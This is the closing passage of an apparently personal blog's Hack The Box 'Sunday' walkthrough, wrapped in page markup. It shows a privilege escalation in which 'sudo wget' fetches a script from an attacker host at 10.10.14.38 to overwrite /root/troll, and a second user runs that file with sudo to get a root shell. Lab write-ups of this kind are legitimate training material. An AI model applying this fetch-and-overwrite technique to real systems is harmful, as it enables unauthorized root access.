+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sammy@sunday:~$ sudo wget http://10.10.14.38/craft.sh -O /root/troll
+--17:17:14--  http://10.10.14.38/craft.sh
+           <span style=color:#ff79c6>=</span>&gt; <span style=color:#f1fa8c>`</span>/root/troll<span style=color:#f1fa8c>&#39;
+</span><span style=color:#f1fa8c>Connecting to 10.10.14.38:80... connected.
+</span><span style=color:#f1fa8c>HTTP request sent, awaiting response... 200 OK
+</span><span style=color:#f1fa8c>Length: 22 [text/x-sh]
+</span><span style=color:#f1fa8c>
+</span><span style=color:#f1fa8c>100%[==========================================================================&gt;] 22            --.--K/s
+</span><span style=color:#f1fa8c>
+</span><span style=color:#f1fa8c>17:17:14 (5.61 KB/s) - `/root/troll&#39;</span> saved <span style=color:#ff79c6>[</span>22/22<span style=color:#ff79c6>]</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>As user sunny:</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sunny@sunday:~$ sudo /root/troll
+root@sunday:~# id
+<span style=color:#8be9fd;font-style:italic>uid</span><span style=color:#ff79c6>=</span>0<span style=color:#ff79c6>(</span>root<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>gid</span><span style=color:#ff79c6>=</span>0<span style=color:#ff79c6>(</span>root<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>groups</span><span style=color:#ff79c6>=</span>0<span style=color:#ff79c6>(</span>root<span style=color:#ff79c6>)</span>,1<span style=color:#ff79c6>(</span>other<span style=color:#ff79c6>)</span>,2<span style=color:#ff79c6>(</span>bin<span style=color:#ff79c6>)</span>,3<span style=color:#ff79c6>(</span>sys<span style=color:#ff79c6>)</span>,4<span style=color:#ff79c6>(</span>adm<span style=color:#ff79c6>)</span>,5<span style=color:#ff79c6>(</span>uucp<span style=color:#ff79c6>)</span>,6<span style=color:#ff79c6>(</span>mail<span style=color:#ff79c6>)</span>,7<span style=color:#ff79c6>(</span>tty<span style=color:#ff79c6>)</span>,8<span style=color:#ff79c6>(</span>lp<span style=color:#ff79c6>)</span>,9<span style=color:#ff79c6>(</span>nuucp<span style=color:#ff79c6>)</span>,12<span style=color:#ff79c6>(</span>daemon<span style=color:#ff79c6>)</span>
+root@sunday:~# cat /root/root.txt
+<span style=color:#ff79c6>[</span>REDACTED<span style=color:#ff79c6>]</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+</div>
+</article>
+<hr>
+<div class=sharing-buttons>
+<a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f" target=_blank rel=noopener aria-label title="Share on facebook">
+<div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f" target=_blank rel=noopener aria-label title="Share on twitter">
+<div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.tumblr.com/widgets/share/tool?posttype=link&title=HTB%20-%20Sunday&caption=HTB%20-%20Sunday&canonicalUrl=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f" target=_blank rel=noopener aria-label title="Share on tumblr">
+<div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="mailto:?subject=HTB%20-%20Sunday&body=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f" target=_self rel=noopener aria-label title="Share via email">
+<div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f&media=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f;description=HTB%20-%20Sunday" target=_blank rel=noopener aria-label title="Share on pinterest">
+<div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f&title=HTB%20-%20Sunday&summary=HTB%20-%20Sunday&source=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f" target=_blank rel=noopener aria-label title="Share on linkedin">
+<div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f&resubmit=true&title=HTB%20-%20Sunday" target=_blank rel=noopener aria-label title="Share on reddit">
+<div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f;title=HTB%20-%20Sunday" target=_blank rel=noopener aria-label title="Share on xing">
+<div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="whatsapp://send?text=HTB%20-%20Sunday%20https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f" target=_blank rel=noopener aria-label title="Share on whatsapp">
+<div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f&t=HTB%20-%20Sunday" target=_blank rel=noopener aria-label title="Share on hacker news">
+<div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://telegram.me/share/url?text=HTB%20-%20Sunday&url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f09%2fhtb-sunday%2f" target=_blank rel=noopener aria-label title="Share on telegram">
+<div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+</div>
+</div>
+</a>
+</div>
+<hr>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h></span>
+</div>
+<div class=pagination__buttons>
+<a href=https://0xade1.github.io/posts/2020/09/htb-tenten/ class="button previous">
+<span class=button__icon>←</span>
+<span class=button__text>HTB - Tenten</span>
+</a>
+<a href=https://0xade1.github.io/posts/2020/09/htb-optimum/ class="button next">
+<span class=button__text>HTB - Optimum</span>
+<span class=button__icon>→</span>
+</a>
+</div>
+</div>
+<hr>
+</main>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class=footer__content>
+<span>&copy; 2022</span>
+<span><a href=https://0xade1.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span>
+</div>
+</div>
+<div class=footer__inner>
+<div class=footer__content>
+<span>Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>Made with &#10084;</span>
+</div>
+</div>
+</footer>
+</div>
+<script type=text/javascript src=https://0xade1.github.io/bundle.min.7015b843bafc394b6094818242f153559f5ca94b331b9faaf6132652c59619aefe60ae36e1637f7ee14fd953892639f466c25095c36d42203a1c195313e93212.js integrity="sha512-cBW4Q7r8OUtglIGCQvFTVZ9cqUszG5+q9hMmUsWWGa7+YK424WN/fuFP2VOJJjn0ZsJQlcNtQiA6HBlTE+kyEg=="></script>
+</body>
+</html>
